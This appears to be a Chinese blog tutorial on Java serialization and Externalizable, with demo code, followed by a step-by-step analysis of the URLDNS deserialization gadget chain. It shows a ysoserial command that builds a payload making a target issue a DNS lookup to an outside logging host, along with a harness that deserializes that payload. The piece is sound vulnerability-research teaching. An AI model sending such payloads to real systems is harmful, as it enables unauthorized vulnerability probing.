<p>动态代理生成的对象(<code>com.sun.proxy.$ProxyXXX</code>)序列化的时候会使用一个特殊的协议：<code>TC_PROXYCLASSDESC(0x7D)</code>，这个常量在<code>java.io.ObjectStreamConstants</code>中定义的。在反序列化时也不会调用<code>java.io.ObjectInputStream</code>类的<code>resolveClass</code>方法而是调用<code>resolveProxyClass</code>方法来转换成类对象的。</p>
<h2 id="Java类序列化"><a href="#Java类序列化" class="headerlink" title="Java类序列化"></a>Java类序列化</h2><p>在很多语言中都提供了对象反序列化支持，Java在JDK1.1(<code>1997年</code>)时就内置了对象反序列化(<code>java.io.ObjectInputStream</code>)支持。Java对象序列化指的是<code>将一个Java类实例序列化成字节数组</code>，用于存储对象实例化信息：类成员变量和属性值。 Java反序列化可以<code>将序列化后的二进制数组转换为对应的Java类实例</code>。</p>
<p>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于<code>Socket</code>传输。 在<code>RMI(Java远程方法调用-Java Remote Method Invocation)</code>和<code>JMX(Java管理扩展-Java Management Extensions)</code>服务中对象反序列化机制被强制性使用。在Http请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</p>
<h3 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h3><p>自从2015年<a href="https://issues.apache.org/jira/browse/COLLECTIONS-580">Apache Commons Collections反序列化漏洞</a>(<a href="https://github.com/frohoff/ysoserial">ysoserial</a>的最早的commit记录是2015年1月29日,说明这个漏洞可能早在2014年甚至更早就已经被人所利用)利用方式被人公开后直接引发了Java生态系统的大地震，与此同时Java反序列化漏洞仿佛掀起了燎原之势，无数的使用了反序列化机制的Java应用系统惨遭黑客疯狂的攻击，为企业安全甚至是国家安全带来了沉重的打击！</p>
<p>直至今日(2019年12月)已经燃烧了Java平台四年之久的反序列化漏洞之火还仍未熄灭。如今的反序列化机制在Java中几乎成为了致命的存在，反序列化漏洞带来的巨大危害也逐渐被我们熟知。2018年1月Oracle安全更新了237个漏洞，而反序列化漏洞就占了28.5%，由此可见Oracle对反序列化机制的深恶痛绝。2012年<code>JEP 154</code>提出了移除反序列化机制：<a href="https://openjdk.java.net/jeps/154">JEP 154: Remove Serialization</a>、<a href="https://bugs.openjdk.java.net/browse/JDK-8046144">JDK-8046144</a>，但似乎并未通过，移除反序列化是一个持久性的工作，短期内我们还是需要靠自身去解决反序列化机制带来的安全问题。</p>
<h3 id="Java-序列化-反序列化"><a href="#Java-序列化-反序列化" class="headerlink" title="Java 序列化&#x2F;反序列化"></a>Java 序列化&#x2F;反序列化</h3><p>在Java中实现对象反序列化非常简单，实现<code>java.io.Serializable(内部序列化)</code>或<code>java.io.Externalizable(外部序列化)</code>接口即可被序列化，其中<code>java.io.Externalizable</code>接口只是实现了<code>java.io.Serializable</code>接口。</p>
<p>反序列化类对象时有如下限制：</p>
<ol>
<li>被反序列化的类必须存在。</li>
<li><code>serialVersionUID</code>值必须一致。</li>
</ol>
<p>除此之外，<strong>反序列化类对象是不会调用该类构造方法</strong>的，因为在反序列化创建类实例时使用了<code>sun.reflect.ReflectionFactory.newConstructorForSerialization</code>创建了一个反序列化专用的<code>Constructor(反射构造方法对象)</code>，使用这个特殊的<code>Constructor</code>可以绕过构造方法创建类实例(前面章节讲<code>sun.misc.Unsafe</code> 的时候我们提到了使用<code>allocateInstance</code>方法也可以实现绕过构造方法创建类实例)。</p>
<h4 id="ObjectInputStream、ObjectOutputStream"><a href="#ObjectInputStream、ObjectOutputStream" class="headerlink" title="ObjectInputStream、ObjectOutputStream"></a>ObjectInputStream、ObjectOutputStream</h4><p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject</code>方法，即序列化类对象。</p>
<p><code>java.io.ObjectInputStream</code>类最核心的功能是<code>readObject</code>方法，即反序列化类对象。</p>
<p>所以，只需借助<code>ObjectInputStream</code>和<code>ObjectOutputStream</code>类我们就可以实现类的序列化和反序列化功能了。</p>
<h4 id="java-io-Serializable-内部序列化"><a href="#java-io-Serializable-内部序列化" class="headerlink" title="java.io.Serializable(内部序列化)"></a>java.io.Serializable(内部序列化)</h4><p><code>java.io.Serializable</code>是一个空的接口,我们不需要实现<code>java.io.Serializable</code>的任何方法，代码如下:</p>
<img src="/image/image-20230717214118285.png" alt="image-20230717214118285" style="zoom:80%;" />

<p>您可能会好奇我们实现一个空接口有什么意义？其实实现<code>java.io.Serializable</code>接口仅仅只用于<code>标识这个类可序列化</code>。实现了<code>java.io.Serializable</code>接口的类原则上都需要生产一个<code>serialVersionUID</code>常量，反序列化时如果双方的<code>serialVersionUID</code>不一致会导致<code>InvalidClassException</code> 异常。如果可序列化类未显式声明 <code>serialVersionUID</code>，则序列化运行时将基于该类的各个方面计算该类的默认 <code>serialVersionUID</code>值。</p>
<h5 id="DeserializationTest-java"><a href="#DeserializationTest-java" class="headerlink" title="DeserializationTest.java"></a>DeserializationTest.java</h5><p>核心逻辑其实就是使用<code>ObjectOutputStream</code>类的<code>writeObject</code>方法序列化<code>DeserializationTest</code>类，使用<code>ObjectInputStream</code>类的<code>readObject</code>方法反序列化<code>DeserializationTest</code>类</p>
<p>简化后的代码片段如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 序列化DeserializationTest类</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">out.writeObject(t);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化输入流数据为DeserializationTest对象</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"><span class="type">DeserializationTest</span> <span class="variable">test</span> <span class="operator">=</span> (DeserializationTest) in.readObject();</span><br></pre></td></tr></table></figure>



<h4 id="使用反序列化方式创建类实例"><a href="#使用反序列化方式创建类实例" class="headerlink" title="使用反序列化方式创建类实例"></a>使用反序列化方式创建类实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取sun.reflect.ReflectionFactory对象</span></span><br><span class="line">            <span class="type">ReflectionFactory</span> <span class="variable">reflectionFactory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用反序列化方式获取DeserializationTest类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> reflectionFactory.newConstructorForSerialization(DeserializationTest.class, Object.class.getConstructor());</span><br><span class="line">            System.out.println(constructor.newInstance());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230717224232836.png" alt="image-20230717224232836" style="zoom:80%;" />

<h4 id="java-io-Externalizable-外部序列化"><a href="#java-io-Externalizable-外部序列化" class="headerlink" title="java.io.Externalizable(外部序列化)"></a>java.io.Externalizable(外部序列化)</h4><p><code>java.io.Externalizable</code>和<code>java.io.Serializable</code>几乎一样，只是<code>java.io.Externalizable</code>接口定义了<code>writeExternal</code>和<code>readExternal</code>方法需要序列化和反序列化的类实现，其余的和<code>java.io.Serializable</code>并无差别。</p>
<img src="/image/image-20230717224556096.png" alt="image-20230717224556096" style="zoom:80%;" />

<h5 id="ExternalizableTest-java"><a href="#ExternalizableTest-java" class="headerlink" title="ExternalizableTest.java"></a>ExternalizableTest.java</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExternalizableTest</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Externalizable&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// make the client log the Object</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    实现了writeExternal和readExternal方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput oot)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        oot.writeObject(username);</span><br><span class="line">        oot.writeObject(email);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput oit)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = (String) oit.readObject();</span><br><span class="line">        <span class="built_in">this</span>.email = (String) oit.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建ExternalizableTest对象，并初始化</span></span><br><span class="line">            <span class="type">ExternalizableTest</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExternalizableTest</span>();</span><br><span class="line">            t.setUsername(<span class="string">&quot;Y5neKO&quot;</span>);</span><br><span class="line">            t.setEmail(<span class="string">&quot;1727058834@qq.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java对象序列化输出流对象</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化ExternalizableTest类</span></span><br><span class="line">            oos.writeObject(t);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;序列化后的 数据：&quot;</span>);</span><br><span class="line">            System.out.println(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 打印ExternalizableTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址</span></span><br><span class="line">            System.out.println(<span class="string">&quot;ExternalizableTest类序列化后的字节数组:&quot;</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用ExternalizableTest类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java对象输入流</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化输入流数据为ExternalizableTest对象</span></span><br><span class="line">            <span class="type">ExternalizableTest</span> <span class="variable">test</span> <span class="operator">=</span> (ExternalizableTest) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">&quot;用户名:&quot;</span> + test.getUsername() + <span class="string">&quot;\n邮箱:&quot;</span> + test.getEmail());</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230719221141221.png" alt="image-20230719221141221" style="zoom:80%;" />



<h3 id="自定义序列化-writeObject-和反序列化-readObject"><a href="#自定义序列化-writeObject-和反序列化-readObject" class="headerlink" title="自定义序列化(writeObject)和反序列化(readObject)"></a>自定义序列化(writeObject)和反序列化(readObject)</h3><p>实现了<code>java.io.Serializable</code>接口的类，还可以定义如下方法(<code>反序列化魔术方法</code>)，这些方法将会在类序列化或反序列化过程中调用：</p>
<ol>
<li><strong><code>private void writeObject(ObjectOutputStream oos)</code>,自定义序列化。</strong></li>
<li><strong><code>private void readObject(ObjectInputStream ois)</code>，自定义反序列化。</strong></li>
<li><code>private void readObjectNoData()</code>。</li>
<li><code>protected Object writeReplace()</code>，写入时替换对象。</li>
<li><code>protected Object readResolve()</code>。</li>
</ol>
<p>具体的方法名定义在<code>java.io.ObjectStreamClass#ObjectStreamClass(java.lang.Class&lt;?&gt;)</code>，其中方法有详细的声明。</p>
<h3 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境：</span><br><span class="line">JDK版本：不限</span><br><span class="line">组件版本：JDK原生</span><br></pre></td></tr></table></figure>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>URLDNS主要的作用就在于检测服务器上是否存在反序列化漏洞，如果存在就会发送一个DNS请求，这里所利用的就类似于SSRF的一中形式，所以漏洞的触发点就在URL上面（攻击者有可能找RCE的时候没找到，然后找到了URL上面，能够利用一下上面的SSRF）</p>
<p>利用链只依赖jdk本身提供的类，不依赖其他第三方类，所以具有很高的通用性，可以用于判断目标是否存在反序列化漏洞。</p>
<p>我们可以从ysoserial工具的URLDNS链的payload注释中看见整条利用链</p>
<img src="/image/image-20230804170018898.png" alt="image-20230804170018898" style="zoom:80%;" />

<p>可以看到触发点是HashMap类的readObject方法，直接开始审计</p>
<img src="/image/image-20230804174258121.png" alt="image-20230804174258121" style="zoom:80%;" />

<p>可以看到HashMap实现了Serializable接口，跟进到readObject方法</p>
<p>关键代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>readObject首先从输出流中读取序列化数据，然后开始一系列反序列化操作，到最后来到了gadget中的putVal方法</p>
<img src="/image/image-20230804175643574.png" alt="image-20230804175643574" style="zoom:80%;" />



<p>putVal方法本身是用来实现Map.put及相关方法，我们要关注的是其中调用的hash方法</p>
<p>跟进hash方法</p>
<img src="/image/image-20230804180443981.png" alt="image-20230804180443981" style="zoom:80%;" />

<p>如果key对象不是null的话就会调用hashCode方法，而这个key对象来自哪里</p>
<p>反观一下readObject方法</p>
<img src="/image/image-20230804180854619.png" alt="image-20230804180854619" style="zoom:80%;" />

<p>我们发现key对象就来自于反序列化后的内容，也就是我们传入的URL类对象</p>
<p>因此我们回到hashCode方法，跟进<code>java.net.URL</code>类</p>
<img src="/image/image-20230804170618792.png" alt="image-20230804170618792" style="zoom:80%;" />

<p>可以看到URL类实现了Serializable接口</p>
<p>继续跟进到触发点hashCode方法</p>
<img src="/image/image-20230804172724243.png" alt="image-20230804172724243" style="zoom:80%;" />

<img src="/image/image-20230804172825251.png" alt="image-20230804172825251" style="zoom:80%;" />

<p>可以看到如果hashCode值不等于-1的话，就会直接返回hashCode的值，则不会触发url解析</p>
<p>如果等于-1就会调用handler的hashCode方法，跟进看看handler对象</p>
<img src="/image/image-20230804173500476.png" alt="image-20230804173500476" style="zoom:80%;" />

<p>发现是URLStreamHandler类，也就是说这里实际上调用的是handler的hashCode方法，跟进</p>
<img src="/image/image-20230804182326182.png" alt="image-20230804182326182" style="zoom:80%;" />

<p>可以看到调用了getHostAddress方法，跟进</p>
<img src="/image/image-20230804183230731.png" alt="image-20230804183230731" style="zoom:80%;" />

<p>这里通过InetAddress类的getByName方法进行了DNS解析，这就是最终产生DNS解析记录的地方</p>
<p>整个调用链如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.<span class="built_in">hash</span>() -&gt; URL.hashCode() -&gt; URLStreamHandler.hashCode().getHostAddress() -&gt; URLStreamHandler.getHostAddress().InetAddress.getByName()</span><br></pre></td></tr></table></figure>



<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>我们通过一段反序列化代码测试一下</p>
<p><strong>TestURLDNS.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;URLDNS&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">test</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过ysoserial生成URLDNS的payload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar URLDNS &quot;http://d1dd3347.su19.org&quot; &gt; URLDNS</span><br></pre></td></tr></table></figure>

<p>我们直接在HashMap类的readObject方法下断点，然后运行</p>
<img src="/image/image-20230804202828380.png" alt="image-20230804202828380" style="zoom:80%;" />

<p>可以看到我们的payload反序列化后作为key传入hash函数</p>
<img src="/image/image-20230804203153864.png" alt="image-20230804203153864" style="zoom:80%;" />

<p>此时key不为null，调用URL类的hashCode方法</p>
<img src="/image/image-20230804203629009.png" alt="image-20230804203629009" style="zoom:80%;" />

<p>上一步中传入hashCode值为-1，紧接着调用handler（URLStreamHandler类）的hashCode方法，并传入this（URL类）</p>
<img src="/image/image-20230804203908898.png" alt="image-20230804203908898" style="zoom:80%;" />

<p>后面就是形成dns解析的过程了，我们直接略过</p>
<img src="/image/image-20230804204419268.png" alt="image-20230804204419268" style="zoom:80%;" />

<p>成功解析</p>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>回到gadget，我们发现HashMap.put()方法中也调用了hash方法</p>
<img src="/image/image-20230804204635462.png" alt="image-20230804204635462" style="zoom:80%;" />

<p>按道理来说进行put操作的时候也会触发dns解析</p>
<p><strong>TestHashMapPut.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestHashMapPut</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://d1dd3347.su19.org/&quot;</span>);</span><br><span class="line">        map.put(url, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230804205205833.png" alt="image-20230804205205833" style="zoom:80%;" />

<p>可以看到确实触发了解析，我们再看一下ysoserial工具序列化生成payload的过程</p>
<img src="/image/image-20230804205339113.png" alt="image-20230804205339113" style="zoom:80%;" />

<p>这里也用到了HashMap.put方法，但没有产生dns解析记录</p>
<p>其实是因为重写了openConnection方法和getHostAddress方法，作者是为了防止干扰误判才进行了重写</p>
<img src="/image/image-20230804205519095.png" alt="image-20230804205519095" style="zoom:80%;" />

<p>那这样的话反序列化后会不会也执行不了dns查询呢</p>
<p>看一下URL类中handler的处理</p>
<img src="/image/image-20230804210722636.png" alt="image-20230804210722636" style="zoom:80%;" />

<p>我们发现是通过transient进行修饰的，而被transient修饰的属性无法被序列化，因此在最终反序列化的过程中仍然能执行dns查询</p>
<p><strong>TestTransient.java</strong></p>
